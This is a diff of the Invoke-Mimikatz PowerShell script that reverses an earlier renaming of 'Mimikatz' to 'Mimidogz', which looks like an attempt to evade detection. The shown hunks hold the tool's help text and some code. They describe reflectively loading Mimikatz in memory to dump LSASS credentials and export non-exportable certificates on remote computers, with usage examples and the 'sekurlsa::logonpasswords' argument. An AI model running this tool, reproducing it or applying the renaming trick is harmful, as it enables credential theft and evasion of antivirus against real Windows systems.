@@ -1,38 +1,38 @@
-function Invoke-Mimidogz
+function Invoke-Mimikatz
 {
 <#
 .SYNOPSIS
 
-This script leverages Mimidogz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimidogz completely in memory. This allows you to do things such as
-dump credentials without ever writing the Mimidogz binary to disk. 
+This script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as
+dump credentials without ever writing the mimikatz binary to disk. 
 The script has a ComputerName parameter which allows it to be executed against multiple computers.
 
 This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.
 
-Function: Invoke-Mimidogz
+Function: Invoke-Mimikatz
 Author: Joe Bialek, Twitter: @JosephBialek
-Mimidogz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilkiwi
+Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilkiwi
 License:  http://creativecommons.org/licenses/by/3.0/fr/
-Required Dependencies: Mimidogz (included)
+Required Dependencies: Mimikatz (included)
 Optional Dependencies: None
-Mimidogz version: 2.0 alpha (12/14/2015)
+Mimikatz version: 2.0 alpha (12/14/2015)
 
 .DESCRIPTION
 
-Reflectively loads Mimidogz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any 
-functionality provided with Mimidogz.
+Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any 
+functionality provided with Mimikatz.
 
-.PARAMETER DumpCred
+.PARAMETER DumpCreds
 
-Switch: Use Mimidogz to dump credentials out of LSASS.
+Switch: Use mimikatz to dump credentials out of LSASS.
 
 .PARAMETER DumpCerts
 
-Switch: Use Mimidogz to export all private certificates (even if they are marked non-exportable).
+Switch: Use mimikatz to export all private certificates (even if they are marked non-exportable).
 
 .PARAMETER Command
 
-Supply Mimidogz a custom command line. This works exactly the same as running the Mimidogz executable like this: Mimidogz "privilege::debug exit" as an example.
+Supply mimikatz a custom command line. This works exactly the same as running the mimikatz executable like this: mimikatz "privilege::debug exit" as an example.
 
 .PARAMETER ComputerName
 
@@ -40,38 +40,38 @@ Optional, an array of computernames to run the script on.
 	
 .EXAMPLE
 
-Execute Mimidogz on the local computer to dump certificates.
-Invoke-Mimidogz -DumpCerts
+Execute mimikatz on the local computer to dump certificates.
+Invoke-Mimikatz -DumpCerts
 
 .EXAMPLE
 
-Execute Mimidogz on two remote computers to dump credentials.
-Invoke-Mimidogz -DumpCred -ComputerName @("computer1", "computer2")
+Execute mimikatz on two remote computers to dump credentials.
+Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")
 
 .EXAMPLE
 
-Execute Mimidogz on a remote computer with the custom command "privilege::debug exit" which simply requests debug privilege and exits
-Invoke-Mimidogz -Command "privilege::debug exit" -ComputerName "computer1"
+Execute mimikatz on a remote computer with the custom command "privilege::debug exit" which simply requests debug privilege and exits
+Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
 
 .NOTES
-This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimidogz code written by Benjamin DELPY
+This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimikatz code written by Benjamin DELPY
 Find Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
-Find Mimidogz at: http://blog.gentilkiwi.com
+Find mimikatz at: http://blog.gentilkiwi.com
 
 .LINK
 
-http://clymb3r.wordpress.com/2013/04/09/modifying-Mimidogz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
+http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
 #>
 
-[CmdletBinding(DefaultParameterSetName="DumpCred")]
+[CmdletBinding(DefaultParameterSetName="DumpCreds")]
 Param(
 	[Parameter(Position = 0)]
 	[String[]]
 	$ComputerName,
 
-    [Parameter(ParameterSetName = "DumpCred", Position = 1)]
+    [Parameter(ParameterSetName = "DumpCreds", Position = 1)]
     [Switch]
-    $DumpCred,
+    $DumpCreds,
 
     [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
     [Switch]
@@ -2633,7 +2633,7 @@ $RemoteScriptBlock = {
 			### YOUR CODE GOES HERE
 			#########################################
                     Write-Verbose "Calling function with WString return type"
-				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_Mimidogz"
+				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_mimikatz"
 				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
 				    {
 					    Throw "Couldn't find function address."
@@ -2705,7 +2705,7 @@ Function Main
 	Write-Verbose "PowerShell ProcessID: $PID"
 	
 
-	if ($PsCmdlet.ParameterSetName -ieq "DumpCred")
+	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
 	{
 		$ExeArgs = "sekurlsa::logonpasswords exit"
 	}
